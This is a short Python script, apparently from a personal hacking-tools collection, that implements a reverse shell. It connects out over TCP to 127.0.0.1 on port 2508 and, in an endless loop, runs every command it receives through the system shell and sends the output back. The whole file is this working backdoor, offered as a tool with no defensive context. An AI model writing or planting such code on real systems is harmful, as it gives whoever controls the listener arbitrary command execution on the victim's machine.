#!/usr/bin/env python

# Created by un4ckn0wl3z-level99
# Website -> www.un4ckn0wl3z.xyz
# Date -> 7/28/2018

import socket
import subprocess


def exec_sys_cmd(cmd):
    return subprocess.check_output(cmd,shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("127.0.0.1",2508))

connection.send("\n[+] connection established.\n")
while True:
    cmd = connection.recv(1024)
    cmd_result = exec_sys_cmd(cmd)
    connection.send(cmd_result)



connection.close()